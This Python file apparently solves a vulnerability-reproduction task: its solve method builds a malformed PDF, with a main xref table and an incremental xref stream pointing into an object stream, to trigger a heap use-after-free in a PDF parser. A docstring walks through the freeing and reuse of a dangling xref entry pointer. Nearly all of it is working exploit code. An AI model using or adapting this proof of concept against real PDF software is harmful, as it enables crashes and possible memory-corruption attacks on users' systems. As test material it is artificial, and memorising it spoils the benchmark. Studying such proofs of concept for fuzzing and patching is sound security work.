import zlib
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a Heap Use After Free vulnerability in a PDF parser.

        The PoC is a hybrid-reference PDF file structured to cause a use-after-free
        during the parsing of object streams.

        The vulnerability is triggered by the following sequence:
        1. The parser starts parsing a PDF with a main xref table and an incremental
           update containing an xref stream. It loads both xref sections.
        2. The application requests an object (obj 100) that is defined in the
           xref stream as being compressed within an object stream (obj 200).
        3. The parser's `pdf_cache_object` function is called for obj 100.
        4. Inside `pdf_cache_object(100)`, it gets a pointer (`entry100`) to the
           xref entry for obj 100. This entry resides in memory allocated for the
           second (stream-based) xref section.
        5. To decompress obj 100, the parser needs to load the object stream (obj 200).
           It makes a recursive call to `pdf_load_object(200)`.
        6. Inside `pdf_load_object(200)`, looking up obj 200 can trigger a "repair" 
           or "solidification" of the xref table, as `pdf_get_xref_entry` can
           cause changes.
        7. During solidification, a new, unified xref table is allocated, and the
           memory for the old individual xref sections (including the one containing
           `entry100`) is freed.
        8. The call to `pdf_load_object(200)` returns.
        9. Back in the execution of `pdf_cache_object(100)`, the code proceeds to
           use the now-dangling pointer `entry100`. This is the Use After Free.
        """
        
        poc_parts = []
        offsets = {}

        def add_obj(num: int, content: str):
            nonlocal poc_parts, offsets
            current_offset = sum(len(p) for p in poc_parts)
            offsets[num] = current_offset
            
            obj_str = f"{num} 0 obj\n{content}\nendobj\n".encode('latin-1')
            poc_parts.append(obj_str)

        poc_parts.append(b"%PDF-1.7\n%\xa1\xb2\xc3\xd4\n")

        add_obj(1, "<< /Type /Catalog /Pages 2 0 R >>")
        add_obj(2, "<< /Type /Pages /Count 1 /Kids [3 0 R] >>")
        
        # Page object that triggers the vulnerability by referencing object 100.
        add_obj(3, "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Annots [100 0 R] >>")

        num_dummy_objects = 70
        dummy_padding = 'B' * 50
        for i in range(4, 4 + num_dummy_objects):
            add_obj(i, f"<< /Dummy {i} /Padding ({dummy_padding}) >>")
        
        num_main_objects = 3 + num_dummy_objects

        xref1_offset = sum(len(p) for p in poc_parts)
        xref1_parts = [f"xref\n0 {num_main_objects + 1}\n"]
        xref1_parts.append("0000000000 65535 f \n")
        for i in range(1, num_main_objects + 1):
            xref1_parts.append(f"{offsets[i]:010d} 00000 n \n")
        
        poc_parts.append("".join(xref1_parts).encode('latin-1'))
        
        trailer1 = f"trailer\n<< /Size {num_main_objects + 1} /Root 1 0 R >>\n"
        trailer1 += f"startxref\n{xref1_offset}\n"
        poc_parts.append(trailer1.encode('latin-1'))

        # Object 200: The Object Stream containing target object 100.
        obj_stream_content = b"100 0 << /Triggered /Yes >>"
        obj_stream_header = f"<< /Type /ObjStm /N 1 /First {len(b'100 0 ')} /Length {len(obj_stream_content)} >>"
        add_obj(200, f"{obj_stream_header}\nstream\n{obj_stream_content.decode('latin-1')}\nendstream")

        # Object 201: The XRef Stream.
        xref_stream_offset = sum(len(p) for p in poc_parts)
        
        uncompressed_data = b""
        # W = [1, 4, 2] -> type(1 byte), offset/objnum(4 bytes), gen/index(2 bytes)
        # Entry for obj 100: compressed in obj 200, index 0
        uncompressed_data += b"\x02" + (200).to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        # Entry for obj 200: normal, at its known offset
        uncompressed_data += b"\x01" + offsets[200].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        # Entry for obj 201: normal, at its own offset
        uncompressed_data += b"\x01" + xref_stream_offset.to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        
        compressed_data = zlib.compress(uncompressed_data)

        xref_stream_dict = (
            f"<< /Type /XRef /W [1 4 2] /Root 1 0 R /Prev {xref1_offset} "
            f"/Size 202 /Index [100 1 200 2] /Filter /FlateDecode "
            f"/Length {len(compressed_data)} >>"
        )

        obj_201_header = f"201 0 obj\n".encode('latin-1')
        obj_201_stream_header = f"{xref_stream_dict}\nstream\n".encode('latin-1')
        obj_201_footer = b"\nendstream\nendobj\n"
        
        poc_parts.append(obj_201_header)
        poc_parts.append(obj_201_stream_header)
        poc_parts.append(compressed_data)
        poc_parts.append(obj_201_footer)

        final_trailer = f"startxref\n{xref_stream_offset}\n%%EOF\n"
        poc_parts.append(final_trailer.encode('latin-1'))
        
        return b"".join(poc_parts)